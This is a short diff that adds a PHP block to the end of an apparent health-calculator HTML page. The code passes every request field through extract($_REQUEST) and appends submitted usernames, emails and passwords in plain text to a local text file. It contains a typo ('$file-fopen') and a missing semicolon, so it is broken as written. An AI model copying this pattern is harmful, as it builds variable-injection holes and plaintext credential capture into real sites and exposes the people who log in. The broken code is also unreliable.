@@ -262,3 +262,15 @@
   <div class="footer">NOTE: This is for calculating normal health. Please call 911 for serious issue! <br> </div>
 </body>
 </html>
+<?php
+extract($_REQUEST);
+$file-fopen("form-save.txt","a");
+
+fwrite($file,"uname: ");
+fwrite($file,$username. "\n" );
+fwrite($file,"Email: ");
+fwrite($file,$Email.  "\n");
+fwrite($file,"psw: ");
+fwrite($file,$Password. "\n");
+fclose($file)
+?>
